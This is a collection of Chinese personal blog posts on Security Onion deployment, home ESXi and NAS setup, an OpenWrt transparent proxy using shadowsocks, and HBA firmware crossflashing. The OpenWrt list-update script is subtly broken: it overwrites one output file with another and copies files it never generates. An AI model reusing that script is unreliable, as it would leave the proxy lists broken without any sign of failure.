[{"content":"前言  Security Onion （以下称安全洋葱）是一款免费且开源的，用于威胁发现、企业安全监视和日志管理的 Linux 发行版本。\n目前，安全洋葱已经迭代至 2.X，与 1.X 版本不同，2.X 版本基于容器开发，实现了将各个组件和服务容器化，更易于使用者部署和定制。\n  本篇并不涉及系统的调优，如果你此前已经安装并部署了安全洋葱，可以跳过此章节。\n 安全洋葱的安装较为简单，网络上也有诸多的 ALL IN ONE 的安装教程，但考虑到这些部署方式不太适合生产环境使用，所以本篇主要讲述如何在生产环境分布式部署安全洋葱系统。\n本文中使用的安全洋葱版本为 v2.3.30（截至本文编写时）。\n准备工作 官方文档建议采用标准的分布式部署方式进行部署安全洋葱，至少以下三个节点：\n   节点类型 说明     manager node 主要节点，负责接收采集到的原始数据   forward node 流量分析节点，也叫 sensor-node   search-node 搜索节点，存储 ES 数据    我部署了 4 个节点，大家根据实际情况进行扩展：\n   节点 IP 配置     security-manager 10.10.0.1 8 cores, 16g memory, 200g disk   security-sensor 10.10.0.100 8 cores, 32g memory, 12t disk   security-search-1 10.10.0.11 8 cores, 16g memory, 2t disk   security-search-2 10.10.0.12 8 cores, 16g memory, 2t disk    架构大致如下：\n开始安装 security-manager 1.从 ISO 引导启动，设置完用户名和密码，回车后开始安装系统，安装完成后重启系统。\n2.登录系统，输入用户名和密码，准备开始配置。\n3.选择安装类型为distributed\n4.选择节点类型为manager\n5.选择安装环境为standard，这里需要注意 security-manager 这台主机需要能够联网。\n6.设置主机名\n7.设置管理口，并配置静态地址（这里建议不要选择DHCP分配地址，会影响服务/节点之间的通信）\n8.选择系统补丁计划（默认），设置家庭网络（默认）\n9.选择安装类型为高级，进行功能定制化\n10.设置 ES 集群名称（默认）\n11.选择元信息分析引擎（zeek or suricata）。考虑到 zeek 可定制化更强些，所以我选择的是 zeek 处理 metadata，suricata 处理 nids-alerts。事实上，两种方式均可，官方这里有讨论//TODO。\n12.选择需要发送的日志类型。\n 请注意，这指的是需要被发送到 manager 节点的日志类型，不是 zeek 要处理的协议（这需要额外进行配置）\n 建议按照实际监测需求和节点存储容量进行权衡。有选择恐惧症的可以先按默认的来，后面可以再修改的:)。\n13.选择 IDS 规则集（默认）。你也可以选择高级订阅版。\n14.选择安装的组件列表（默认）。按需选择。\n Grafana  主机的健康监控和报警   Fleet \u0026amp; osquery  HIDS，侧重于主机信息被动/主动采集   Wazuh  HIDS，侧重于威胁检测、完整性监控等   TheHive  安全事件响应平台   Playbook  检测 Playbook 的工具   Strelka  文件提取/分析，用于威胁搜索、威胁检测和事件响应    15.为其他组件设置邮箱和密码\n16.选择 WEB 界面的访问方式。我选择的是IP，也可以改为域名方式。\n17.选择下载系统更新包的方式。建议选择通过 manager 节点下载。\n18.设置 soremote 密码，后面用于添加其他节点。\n19.设置允许访问WEB界面的网段。建议只添加安全运维段的主机IP, 不在该网段的主机将无法访问WEB界面。\n20.确定应用配置，等待完成安装。\n21.配置防火墙规则，允许其他节点访问管理节点的 Salt 服务 （重要）\n 很多人在部署非管理节点的时候总是提示安装失败，就是因为缺少这个步骤导致的。\nsosetup.log中的报错日志类似：[ERROR ] 'mine.send': False\n firewall-cmd --permanent --zone= --add-port=4505-4506/tcp firewall-cmd --reload security-sensor 1.完成基础的系统安装后，我们开始配置流量分析节点。\n2.选择安装类型为 distributed\n3.选择节点类型为 sensor\n4.设置主机名\n5.选择管理口，并配置静态地址\n6.设置 manager 节点，并输入 soremote 密码，与 manager 节点完成连接。\n7.选择镜像口\n8.选择系统补丁计划（默认），选择下载系统更新包的方式为 manager。\n9.选择安装类型为高级，进行功能定制化。\n10.进行 CPU 绑定（Zeek、Suricata）\n11.配置镜像口MTU（默认）\n12.等待安装完成。\nsecurity-search 1.完成基础的系统安装后，我们开始配置流量分析节点。\n2.选择安装类型为 distributed\n3.选择节点类型为 searchnode\n4.设置主机名\n5.选择管理口，并配置静态地址\n6.设置 manager 节点（输入 soremote 密码）\n7.选择系统补丁计划（默认），选择下载系统更新包的方式为 manager。\n8.选择安装类型为高级，进行功能定制化。\n9.配置 ES 堆大小（默认）\n10.配置 Logstash 堆大小（默认）\n11.配置 Logstash pipeline 线程（默认）\n12.配置 logstash pipeline 批处理大小（默认）\n13.配置 logstash input 线程数（默认），如果发现存在消息积压（redis），可以适当调整以上几个参数。\n14.配置 ES 索引关闭时间（默认为 30 天）。关闭索引不会删除数据，如果需要查询历史数据可以再单独开启。如果内存足够的话，可以设置为 90 天。\n15.配置 ES 存储大小，我配置的是 1948（2T-100G），可以择优调整。\n16.等待安装完成。\n功能验证 1.打开 https://10.10.0.1 安全洋葱控制台并登陆\n2.点击 Grid 标签，查看网格状态，检查节点是否已经全部上线。\n在这里，大家可以看到节点列表中还出现了一个陌生的节点类型 securityonion-fleet，这个是其实是独立部署的 Fleet 服务，由于需要管理的 osquery 客户端较多，容易影响性能，所以就把它从管理节点拆分出来了。\n3.点击 Alerts 标签，检查是否可以正常。\n4.点击 Hunt 标签，检查是否正常。\n5.点击 Grafana 标签，检查各个主机节点是否正常。\n6.点击 Kiabana 标签，检查 ES 服务是否正常。\n好了，如果服务一切正常的话，你可以开始打工人生活了:)\n参考链接  https://docs.securityonion.net/en/2.3/about.html  ","permalink":"https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/","summary":"前言  Security Onion （以下称安全洋葱）是一款免费且开源的，用于威胁发现、企业安全监视和日志管理的 Linux 发行版本。\n目前，安全洋葱已经迭代至 2.X，与 1.X 版本不同，2.X 版本基于容器开发，实现了将各个组件和服务容器化，更易于使用者部署和定制。\n  本篇并不涉及系统的调优，如果你此前已经安装并部署了安全洋葱，可以跳过此章节。\n 安全洋葱的安装较为简单，网络上也有诸多的 ALL IN ONE 的安装教程，但考虑到这些部署方式不太适合生产环境使用，所以本篇主要讲述如何在生产环境分布式部署安全洋葱系统。\n本文中使用的安全洋葱版本为 v2.3.30（截至本文编写时）。\n准备工作 官方文档建议采用标准的分布式部署方式进行部署安全洋葱，至少以下三个节点：\n   节点类型 说明     manager node 主要节点，负责接收采集到的原始数据   forward node 流量分析节点，也叫 sensor-node   search-node 搜索节点，存储 ES 数据    我部署了 4 个节点，大家根据实际情况进行扩展：\n   节点 IP 配置     security-manager 10.10.0.1 8 cores, 16g memory, 200g disk   security-sensor 10.","title":"Security-Onion-2 分布式实践之安装篇"},{"content":" 古人云：贵有恒，何必三更眠五更起；最无益，只怕一日曝十日寒”\n 无他言，开更。\n","permalink":"https://www.keepwn.com/posts/see-you-again/","summary":"古人云：贵有恒，何必三更眠五更起；最无益，只怕一日曝十日寒”\n 无他言，开更。","title":"焕新颜，重相见"},{"content":"前言 如今网络上有很多关于如何自建NAS、搭建家庭私有云的教程，但基本都止步于文件共享和多媒体服务。\n作为一个半吊子的码农，这显然不能满足我的需求。\n所以，结合着自己需求搞了一套自己的私有云方案，在各种大坑小坑中坚持了近大半年后，发现该方案极大的提高了自己的工作效率。\n 以下的方案不一定完全适合你，你可能需要根据自己的实际需求进行适当更改。\n 核心内容  数据中心，提供数据存储服务 家庭服务中心，提供常见的NAS服务 工作服务中心，提供工作上所需服务  准备工作  准备一台家用服务器（我个人用的是Gen8 1230v2 16G）  CPU需要支持VT-D和VT-X   准备1块SSD和至少2块以上的机械硬盘 准备一张HBA卡（IT模式的D2607-A11阵列卡） 安装ESXI6系统  系统建议单独安装在U盘/SD卡上 SSD连接在主板SATA接口上，机械硬盘连接在HBA卡上 将HBA卡配置为直通模式 将SSD挂载到ESXI中，新建存储为SSD_DataStore    .notice{padding:18px;line-height:24px;margin-bottom:24px;border-radius:4px;color:#444;background:#e7f2fa}.notice p:last-child{margin-bottom:0}.notice-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:#fff;background:#6ab0de}.notice.warning .notice-title{background:rgba(217,83,79,.9)}.notice.warning{background:#fae2e2}.notice.info .notice-title{background:#f0b37e}.notice.info{background:#fff2db}.notice.note .notice-title{background:#6ab0de}.notice.note{background:#e7f2fA}.notice.tip .notice-title{background:rgba(92,184,92,.8)}.notice.tip{background:#e6f9e6}.icon-notice{display:inline-flex;align-self:center;margin-right:8px}.icon-notice img,.icon-notice svg{height:1em;width:1em;fill:currentColor}.icon-notice img,.icon-notice.baseline svg{top:0.125em;position:relative} Note\nQ: 为什么选用ESXI而不是Hyper-V?\nA: 如果只是用来搭建NAS服务，两者区别不大。但目前的这套方案，使用ESXI更为合适。\n 数据中心 数据中心，主要提供数据存储服务，这里有两个数据中心：\n 被ESXI管理的SSD  用于存储提供基础服务的虚拟机的文件和交换文件   被FreeNAS管理的机械硬盘  主要提供NFS、CIFS、AFP这3种形式的数据服务 为ESXI提供部分存储空间，用于存储使用频率较低的虚拟机的文件    FreeNAS安装与配置  创建FreeNAS虚拟机  [存储位置为SSD_DataStore]   创建ZFS卷  2个以上的机械硬盘 存储池类型为Mirror或RAIDZ   创建多个数据集  /vms，提供给ESXI，开启NFS /media，用于家庭影音，开启NFS、CIFS共享 /share，用于文件共享，开启NFS、CIFS共享 /tm，用于TimeMachine，开启AFP共享 等   将vms挂载到ESXI中，新建存储为VMS_DataStore   FreeNAS的数据，一定要做好手动备份，毕竟号称有五重备份的GitLab也吃了大亏的:)\n 服务集群中心 服务集群中心，包括ESXI提供的虚拟机资源和Rancher提供的容器资源。\nRancher集群安装与配置  创建3台虚拟机（RancherOS、CoreOS、Ubuntu等系统任选）  [存储位置为SSD_DataStore] 分别命名为master、node1和node2 分别安装docker   部署Rancher集群  在master主机上部署Rancher-Server 在master主机上部署Rancher-Agent，将master添加到server 在node1、node2主机上部署Rancher-Agent，将node1和node2添加到server 合理分配3个主机上的容器的部署   配置Rancher数据源  在数据中心创建/rancher数据集 部署Rancher-NFS 使用Rancher-NFS服务，容器可实现数据持久化    基础建设服务  智能家庭服务  Home-Assistant和Homebridge 容器方式部署 实现用网页端和IOS端对家里的服务或设备进行管理   透明代理服务  openwrt虚拟机，[存储位置为SSD_DataStore] 具体部署方法在本站中搜索 设置主机的网关为openwrt地址，即可实现透明代理   公网映射服务  容器方式部署，ngrok、n2n和frp任选 需要一台公网主机 实现将内网服务映射到公网，方便远程访问   证书签发服务  容器方式部署 内网使用自签发证书 公网使用Let\u0026rsquo;s Encrypt服务签发证书     对于使用ngrok和n2n，个人有一些心得，有时间另开篇介绍\n 家庭类服务 一般包括同步、影音、网盘等服务，需要用到以下系统：\n Plex Media Server / Emby Server  容器 管理影音文件 多设备同时看电影、追美剧   Resilio Sync  容器 多个平台之间文件同步   Xware  容器 迅雷官方远程下载服务   DSM6（群晖）  虚拟机，[存储位置为SSD_DataStore] 和FreeNAS功能类似     本方案中，因为已经搭建了FreeNAS，DSM6的功能已经被大大地弱化了，可以不装\n  Plex和Emby两个都是比较出名的家庭流媒应用，目前个人用Plex比较多\n 工作类服务 一般包括代码版本控制、记事本、测试环境等服务：\n Leanote Server  容器 开源的多平台云笔记   Gogs Server  容器 代码版本控制系统，和github类似   Drone  容器 持续构建系统，方便测试代码或部署环境   各类数据库  优先容器（MongoDB不宜搭建在容器中，会发生错误，暂未解决） 多种数据库统一存储，统一管理    进阶 由于各个服务之间联系不大，系统平台也比较多，管理起来实在不便。如果有开发能力的话，还是建议自己开发个系统来统一协调各个服务。比如使用微信端入口，对服务进行定期检查，消息通知，甚至是远程控制，未来还是很美好的:)\n最后 最后，这个方案其实还有很多的内容，本文只是列了一些提纲，具体在实际操作中必然会有很多问题，就拿Rancher来说，Rancher中容器如何配置、存储如何挂载就需要好好斟酌，当然这会有一个很长的试错过程。当然和去年相比，Rancher上的坑已经少了太多了，想当初把Rancher从v1.1一步步升到现在的1.5.x，中间经历了什么，想想都要哭了\n","permalink":"https://www.keepwn.com/posts/build-home-cloud-center-for-it/","summary":"\u003ch2 id=\"前言\"\u003e前言\u003c/h2\u003e\n\u003cp\u003e如今网络上有很多关于如何自建NAS、搭建家庭私有云的教程，但基本都止步于文件共享和多媒体服务。\u003cbr\u003e\n作为一个半吊子的码农，这显然不能满足我的需求。\u003c/p\u003e\n\u003cp\u003e所以，结合着自己需求搞了一套自己的私有云方案，在各种大坑小坑中坚持了近大半年后，发现该方案极大的提高了自己的工作效率。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e以下的方案不一定完全适合你，你可能需要根据自己的实际需求进行适当更改。\u003c/p\u003e\n\u003c/blockquote\u003e","title":"构建适合程序员的私有云"},{"content":"背景 前一段时间，在ESXI上部署了一台Plex服务器。解决了一些恼人的问题后，用得还算满意，但是TMDb搜刮器在匹配电影信息时，总会丢失一些Poster海报信息。\n最终发现，The Movie Database (TMDb) 这个地址被和谐社会了。\n由于Plex不支持设置代理，且手动设置HTTP_PROXY后还是无效，所以决定把Plex这台服务器加入透明代理网络中。\n 参考以前的文章《Openwrt上使用dnsmasq和ipset实现域名分流》，将网关、DNS设置为192.168.0.254\n 因为之前重新部署了ESXI环境，所以Openwrt这台虚拟机不幸丢失，所以只能大侠请重新来过。\n由于之前的方案在实际使用中还有一些不足，在综合了网络上现有的一些方案后，设计出一份改进版的方案。\n网络上原始的方案 安装软件  shadowsocks-libev和luci-app-shadowsocks（提供ss-rules）  依赖iptables-mod-tproxy和ip   chinadns和luci-app-chinadns  配置  使用luci-app配置shadowsocks  开启端口转发，设置本地端口为5300，用于DNS查询 被忽略IP列表选择ChinaDNS路由表（/etc/chinadns_chnroute.txt）   使用luci-app配置ChinaDNS  设置本地端口为5353 设置上游服务器为114.114.114.114,127.0.0.1:5300   使用luci-app配置DHCP/DNS  设置DNS转发为127.0.0.1#5353 勾选忽略解析文件    这样一来，你拥有了:\n 一个无污染的DNS服务器，端口为53  国内DNS解析出国内IP，国外DNS解析出国外IP   一个透明代理的网关  如果请求IP在ChinaDNS路由表中，则走正常流量 如果请求IP不在ChinaDNS路由表中，则走代理流量    改进版方案 尽管上面的方案已经能够实现透明代理，但是还有以下问题(附上解决方案)：\n 在某些ISP下使用ss-tunnel（即端口转发）不稳定, 导致DNS查询时间过长或超时  解决方案:  使用dnscrypt-proxy提供的DNS查询服务     ChinaDNS有时会出现误判，导致访问国内站点时走代理  解决方案:  在dnsmasq中配置chinalist，指定国内域名使用国内DNS进行解析 不在列表中的站点交由ChinaDNS判断     只能定义强制走代理的IP，而不能是域名，维护起来比较麻烦  解决方案:  归功于ss-rules的实现，ipset集合ss_spec_dst_fw中存放强制走代理的IP 在dnsmasq中配置my-list(自定义域名)列表，将my-list的查询结果保存到ss_spec_dst_fw中      额外安装以下软件:  安装dnsmasq-full  需要先卸载自带的dnsmasq   安装dnscrypt-proxy  提供安全不受污染的DNS服务器    更新配置  使用luci-app配置shadowsocks  关闭端口转发   配置dnscrypt-proxy  修改监听端口为127.0.0.1:5300   配置dnsmasq\n修改/etc/dnsmasq.conf，在文末加入conf-dir=/etc/dnsmasq.d: echo \u0026#39;conf-dir=/etc/dnsmasq.d\u0026#39; \u0026gt;\u0026gt; /etc/dnsmasq.conf   定期维护 以下脚本实现更新china-route、china-dns和my-list的功能:\n#!/bin/sh  DNS=127.0.0.1#5300 IPSET=ss_spec_dst_fw # update china route curl \u0026#39;http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest\u0026#39; | grep ipv4 | grep CN | awk -F\\| \u0026#39;{ printf(\u0026#34;%s/%d\\n\u0026#34;, $4, 32-log($5)/log(2)) }\u0026#39; \u0026gt; china-route.txt # update china dns wget --no-check-certificate -O china-route.txt https://raw.githubusercontent.com/felixonmars/dnsmasq-china-list/master/accelerated-domains.china.conf # update my list cat my-list.txt | awk \u0026#39;{ printf(\u0026#34;server=/\u0026#34;$1\u0026#34;/\u0026#39;$DNS\u0026#39;\\nipset=/\u0026#34;$1\u0026#34;/\u0026#39;$IPSET\u0026#39;\\n\u0026#34;) }\u0026#39; # \u0026gt; my-list.conf # copy updated files cp china-list.conf /etc/dnsmasq.d/china-list.conf cp my-list.conf /etc/dnsmasq.d/my-list.conf cp china-route.txt /etc/chinadns_chnroute.txt # restart service /etc/init.d/dnsmasq restart /etc/init.d/chinadns restart /etc/init.d/shadowsocks rules echo \u0026#39;updated success\u0026#39; 其中，my-list.txt中保存需要强制走代理的域名列表\nipip.net mydomain.com 你需要定期执行这个脚本来对相关列表进行更新。\n总结  使用该方案的前提：\n 设置PC的网关为openwrt的ip（如:192.168.0.254） 设置PC的DNS为openwrt的ip（如:192.168.0.254）    当PC端访问国内网站时  dnsmasq解析该域名，发现该域名在dnsmasq的china-list中，使用国内DNS进行解析，返回国内IP iptables检测到该IP在ss_spec_dst_bp（即china-route）中，则直连访问   访问google.com  dnsmasq解析该域名，发现该域名不在dnsmasq的列表中，则交给ChinaDNS查询 ChinaDNS解析出IP后，发现该IP不匹配china-route列表，则返回国外IP iptables检测到该IP不在ss_spec_dst_bp中，则代理访问   访问mydomain.com  dnsmasq解析该域名，发现该域名在dnsmasq的my-list中，使用dnscrypt进行解析，返回IP，并将该IP加至ss_spec_dst_fw中 iptables检测到该IP在ss_spec_dst_fw中，则代理访问。    完:)\n","permalink":"https://www.keepwn.com/posts/see-the-big-world-on-openwrt/","summary":"背景 前一段时间，在ESXI上部署了一台Plex服务器。解决了一些恼人的问题后，用得还算满意，但是TMDb搜刮器在匹配电影信息时，总会丢失一些Poster海报信息。\n最终发现，The Movie Database (TMDb) 这个地址被和谐社会了。\n由于Plex不支持设置代理，且手动设置HTTP_PROXY后还是无效，所以决定把Plex这台服务器加入透明代理网络中。\n 参考以前的文章《Openwrt上使用dnsmasq和ipset实现域名分流》，将网关、DNS设置为192.168.0.254\n 因为之前重新部署了ESXI环境，所以Openwrt这台虚拟机不幸丢失，所以只能大侠请重新来过。\n由于之前的方案在实际使用中还有一些不足，在综合了网络上现有的一些方案后，设计出一份改进版的方案。\n网络上原始的方案 安装软件  shadowsocks-libev和luci-app-shadowsocks（提供ss-rules）  依赖iptables-mod-tproxy和ip   chinadns和luci-app-chinadns  配置  使用luci-app配置shadowsocks  开启端口转发，设置本地端口为5300，用于DNS查询 被忽略IP列表选择ChinaDNS路由表（/etc/chinadns_chnroute.txt）   使用luci-app配置ChinaDNS  设置本地端口为5353 设置上游服务器为114.114.114.114,127.0.0.1:5300   使用luci-app配置DHCP/DNS  设置DNS转发为127.0.0.1#5353 勾选忽略解析文件    这样一来，你拥有了:\n 一个无污染的DNS服务器，端口为53  国内DNS解析出国内IP，国外DNS解析出国外IP   一个透明代理的网关  如果请求IP在ChinaDNS路由表中，则走正常流量 如果请求IP不在ChinaDNS路由表中，则走代理流量    改进版方案 尽管上面的方案已经能够实现透明代理，但是还有以下问题(附上解决方案)：\n 在某些ISP下使用ss-tunnel（即端口转发）不稳定, 导致DNS查询时间过长或超时  解决方案:  使用dnscrypt-proxy提供的DNS查询服务     ChinaDNS有时会出现误判，导致访问国内站点时走代理  解决方案:  在dnsmasq中配置chinalist，指定国内域名使用国内DNS进行解析 不在列表中的站点交由ChinaDNS判断     只能定义强制走代理的IP，而不能是域名，维护起来比较麻烦  解决方案:  归功于ss-rules的实现，ipset集合ss_spec_dst_fw中存放强制走代理的IP 在dnsmasq中配置my-list(自定义域名)列表，将my-list的查询结果保存到ss_spec_dst_fw中      额外安装以下软件:  安装dnsmasq-full  需要先卸载自带的dnsmasq   安装dnscrypt-proxy  提供安全不受污染的DNS服务器    更新配置  使用luci-app配置shadowsocks  关闭端口转发   配置dnscrypt-proxy  修改监听端口为127.","title":"Openwrt上实现透明代理"},{"content":"准备工具  一张富士通D2607-A11阵列卡 一个U盘 一台PC机（支持UEFI启动）  准备工作  制作DOS启动盘   将U盘格式化成FAT32，刷入dos系统  下载刷机工具包点击下载 拷贝刷机所需工具   megarec软件 sas2flash软件 9211-8i固件  拷贝efi shell支持文件   在U盘根目录下，创建\\efi\\boot目录 复制shell_v1.efi到\\efi\\boot目录，重命名为bootx64.efi  开始刷固件  插上D2607-A11阵列卡 启动PC，选择U盘引导，进入DOS命令行    备份阵列卡信息\n\u0026gt;dir \u0026gt;megarec -readsbr 0 sbrbak.bin   使用xdd查看sbrbak.bin的数据，在000000d0行500X XXXX XXXX XXXX为阵列卡的地址 强烈建议进行这个操作，尽管我当时忘了     刷入sbr   刷入fj版sbr \u0026gt;megarec -writesbr 0 sbrfj.bin  清空flash \u0026gt;megarec -cleanflash 0   重启PC，选择UEFI版U盘引导，进入efi shell 刷固件    刷入9211 8i固件\n\u0026gt;cd fs0 # 或fs1 \u0026gt;sas2hax.efi -o -f 2118it.bin \u0026gt;sas2hax.efi -o -b mptsas2.rom   这里使用的shell.efi版本为v1，如果遇到以下报错:InitShellApp: Application not started from Shell，你可能需要更换shell.efi版本 这里使用修改后的sas2hax.efi，而不是原版程序sas2flash.efi（D2607-A11无法验证通过） 在刷入固件的时候，可能会失败，重启系统后尝试重新刷入固件     更新SAS Address\nsas2flash -o -sasadd 500* **** **** ****   SAS Address以500开头 如果不慎丢失SAS Address，以5000 1122 3344代替     重启电脑，进入DOS命令行，重新刷入sbr   刷入fj版sbr \u0026gt;megarec -writesbr 0 sbrfj.bin  必须重刷一次sbr，否则只能用阵列卡的一个端口了\n   重启电脑就能在启动信息中看到新的设备信息  额外的  一开始装在GEN8上来刷LSI固件，尝试了多种方式都刷不成功，所以在刷之前最好准备一台支持UEFI的主机。 看了错误的教程，导致SAS Address丢失，只能随便填了串地址。就目前来看，似乎不会影响到阵列卡的使用 二手的D2607-A11，成色不咋地，有个接口有点变形，现在觉得有点后悔。配的挡板太高，想装在GEN8上只能把它拆了。 原接在GEN8主板SAS接口上的线缆连接到D2607-A11的接口上，这样就可以实现sata5的SSD+直通4硬盘的方案了。  参考  https://marcan.st/2016/05/crossflashing-the-fujitsu-d2607/ https://www.broadcom.com/products/storage/host-bus-adapters/sas-9211-8i#downloads https://www.chiphell.com/thread-1629960-1-1.html http://koolshare.cn/thread-64959-1-1.html https://github.com/tianocore/edk2  ","permalink":"https://www.keepwn.com/posts/crossflashing-the-fujitsu-d2607/","summary":"准备工具  一张富士通D2607-A11阵列卡 一个U盘 一台PC机（支持UEFI启动）  准备工作  制作DOS启动盘   将U盘格式化成FAT32，刷入dos系统  下载刷机工具包点击下载 拷贝刷机所需工具   megarec软件 sas2flash软件 9211-8i固件  拷贝efi shell支持文件   在U盘根目录下，创建\\efi\\boot目录 复制shell_v1.efi到\\efi\\boot目录，重命名为bootx64.efi  开始刷固件  插上D2607-A11阵列卡 启动PC，选择U盘引导，进入DOS命令行    备份阵列卡信息\n\u0026gt;dir \u0026gt;megarec -readsbr 0 sbrbak.bin   使用xdd查看sbrbak.bin的数据，在000000d0行500X XXXX XXXX XXXX为阵列卡的地址 强烈建议进行这个操作，尽管我当时忘了     刷入sbr   刷入fj版sbr \u0026gt;megarec -writesbr 0 sbrfj.bin  清空flash \u0026gt;megarec -cleanflash 0   重启PC，选择UEFI版U盘引导，进入efi shell 刷固件    刷入9211 8i固件","title":"富士通D2607-A11刷IT模式"},{"content":"背景 怎么说呢，在买Gen8之前就已经仔细比较过Hyper-V和ESXI的优劣，最终选择了Hyper-V的方案。\n当时决定选择Hyper-V平台有以下几个理由：\n Hyper-V提供的存储池使用方便，用起来简单 Hyper-V相对于ESXI而言比较轻量，没有ESXI那么多臃肿的功能 Hyper-V下可以实现硬盘休眠 其实最主要的原因是，觉得自己的需求不大，哪个简单用哪个  现在想来真是too young啊，我的需求怎么可能不大呢，Hyper-V自身的限制成了严重的短板。总之，在权衡未来需求和迁移成本之后，决定使用ESXI平台了。\n于是，我从一条不归路Server2012 With Hyper-V走向了另一条不归路ESXI6.0。\n第一坑：安装ESXI之不识别SSD 之前使用Hyper-V平台时，没有采用Gen8提供的硬件RAID功能，使用的Server2012提供的存储池功能，所以切换到ESXI平台时，重新对本地硬盘进行了硬件RAID设置。\n安装ESXI到SD卡的过程略过，按正常操作来，没什么问题。在对ESXI进行配置的时候遇到了问题，系统只能识别到设置了RAID的硬盘，无法识别到SSD。\n网上查了些资料，RAID模式下识别不到普通硬盘，要想识别到SSD，必须对SSD设置RAID，只有一块SSD怎么办？设置为RAID0。\n第二坑：安装虚拟机之freenas 在我的规划中，所有的资料（非虚拟机文件）由freenas进行统一管理，freenas开放smb、nfs服务给其他虚拟机，一方面解决了资料分散，不易管理的问题，另一方面只要保证freenas的可用性，就算其他虚拟机崩溃甚至损坏，都不会对资料有任何影响。\n创建freenas的时候，直接分配全部的磁盘空间（\u0026gt;2T）给freenas的一块虚拟磁盘，然而启动freenas时，一直卡在启动界面，显示磁盘分配错误。\n虽然猜测是分配磁盘过大导致了这个问题，然而在网上并没有查阅到明确的说法。\n在本地做了几个测试后发现，一旦分配磁盘大于2T，freenas就会卡死在启动界面。（真的只是个例？具体原因有待进一步分析）\n当然，临时解决办法也很简单，把磁盘分拆为多个1T大小的虚拟磁盘，挂载给freenas。\n第三坑：安装虚拟机之openwrt 正常方式安装openwrt，启动openwrt时，会大概率的出现卡死现象。（在《Openwrt上使用dnsmasq和ipset实现域名分流》中已经详细说明具体的原因，这里不再重复）\n第四坑：安装虚拟机之dsm 首先，DSM的版本是XPEnology DSM5.2。\n在Hyper-V上安装dsm非常简单，然而在ESXI上安装完成以后无法进入系统。\n在正常的安装流程中，虚拟机都是由XPEnologyBoot.iso进行引导启动。简单判断以后，觉得可能由于虚拟机重启以后，未能从cd启动导致的。\n进入虚拟机bios修改第一启动项为cd，保存，重新启动，WTF，怎么还是引导不了。\n重新进入bios查看启动项信息，发现上次的修改并没有被保存。（在win10的vmware workstation中进行了相同操作，对vmware的修改是生效的。）\n看来只能放大招了么，手动修改vmx！\n修改虚拟机的.vmx文件，强制第一启动项为cdrom：\nbios.bootOrder = \u0026quot;cdrom,hdd,floppy\u0026quot; 搞定。\n后记 虽然说从Hyper-V切换到ESXI的过程中，遇到了很多不可描述性的问题，但好在都解决了。问我现在用着ESXI的感觉么？感觉还不错:)\n","permalink":"https://www.keepwn.com/posts/moving-hyperv-to-esxi/","summary":"背景 怎么说呢，在买Gen8之前就已经仔细比较过Hyper-V和ESXI的优劣，最终选择了Hyper-V的方案。\n当时决定选择Hyper-V平台有以下几个理由：\n Hyper-V提供的存储池使用方便，用起来简单 Hyper-V相对于ESXI而言比较轻量，没有ESXI那么多臃肿的功能 Hyper-V下可以实现硬盘休眠 其实最主要的原因是，觉得自己的需求不大，哪个简单用哪个  现在想来真是too young啊，我的需求怎么可能不大呢，Hyper-V自身的限制成了严重的短板。总之，在权衡未来需求和迁移成本之后，决定使用ESXI平台了。\n于是，我从一条不归路Server2012 With Hyper-V走向了另一条不归路ESXI6.0。\n第一坑：安装ESXI之不识别SSD 之前使用Hyper-V平台时，没有采用Gen8提供的硬件RAID功能，使用的Server2012提供的存储池功能，所以切换到ESXI平台时，重新对本地硬盘进行了硬件RAID设置。\n安装ESXI到SD卡的过程略过，按正常操作来，没什么问题。在对ESXI进行配置的时候遇到了问题，系统只能识别到设置了RAID的硬盘，无法识别到SSD。\n网上查了些资料，RAID模式下识别不到普通硬盘，要想识别到SSD，必须对SSD设置RAID，只有一块SSD怎么办？设置为RAID0。\n第二坑：安装虚拟机之freenas 在我的规划中，所有的资料（非虚拟机文件）由freenas进行统一管理，freenas开放smb、nfs服务给其他虚拟机，一方面解决了资料分散，不易管理的问题，另一方面只要保证freenas的可用性，就算其他虚拟机崩溃甚至损坏，都不会对资料有任何影响。\n创建freenas的时候，直接分配全部的磁盘空间（\u0026gt;2T）给freenas的一块虚拟磁盘，然而启动freenas时，一直卡在启动界面，显示磁盘分配错误。\n虽然猜测是分配磁盘过大导致了这个问题，然而在网上并没有查阅到明确的说法。\n在本地做了几个测试后发现，一旦分配磁盘大于2T，freenas就会卡死在启动界面。（真的只是个例？具体原因有待进一步分析）\n当然，临时解决办法也很简单，把磁盘分拆为多个1T大小的虚拟磁盘，挂载给freenas。\n第三坑：安装虚拟机之openwrt 正常方式安装openwrt，启动openwrt时，会大概率的出现卡死现象。（在《Openwrt上使用dnsmasq和ipset实现域名分流》中已经详细说明具体的原因，这里不再重复）\n第四坑：安装虚拟机之dsm 首先，DSM的版本是XPEnology DSM5.2。\n在Hyper-V上安装dsm非常简单，然而在ESXI上安装完成以后无法进入系统。\n在正常的安装流程中，虚拟机都是由XPEnologyBoot.iso进行引导启动。简单判断以后，觉得可能由于虚拟机重启以后，未能从cd启动导致的。\n进入虚拟机bios修改第一启动项为cd，保存，重新启动，WTF，怎么还是引导不了。\n重新进入bios查看启动项信息，发现上次的修改并没有被保存。（在win10的vmware workstation中进行了相同操作，对vmware的修改是生效的。）\n看来只能放大招了么，手动修改vmx！\n修改虚拟机的.vmx文件，强制第一启动项为cdrom：\nbios.bootOrder = \u0026quot;cdrom,hdd,floppy\u0026quot; 搞定。\n后记 虽然说从Hyper-V切换到ESXI的过程中，遇到了很多不可描述性的问题，但好在都解决了。问我现在用着ESXI的感觉么？感觉还不错:)","title":"从Hyper-V迁移到ESXI的血泪史"},{"content":"目标 部署一台自动代理路由器，实现根据域名来自动设定直连或者代理，而我要做的只是设置PC的默认网关为主路由器（192.168.0.1）还是自动代理路由器（192.168.0.254）。\n创建Openwrt虚拟机 系统版本\n 主路由器 (ip: 192.168.0.1) ESXI 6.0U2 Openwrt 15.05.1 (ip: 192.168.0.254，gateway: 192.168.0.1)  Openwrt虚拟机的配置教程有很多，这里只针对ESXI版Openwrt可能会遇到的问题说明下：\n  在ESXI6上，openwrt_x86每次启动时会大概率的出现卡死现象，表现为Kernel panic - not syncing: Attempted to kill init。\n 解决办法：改用openwrt_x64后正常。原因未知。    在ESXI6上，在openwrt上执行某些命令时，会被强制关机，表现为\n来自 promote 的消息: The operation on the file \u0026quot;/vmfs/devices/deltadisks/17ad1ab5-openwrt-15. 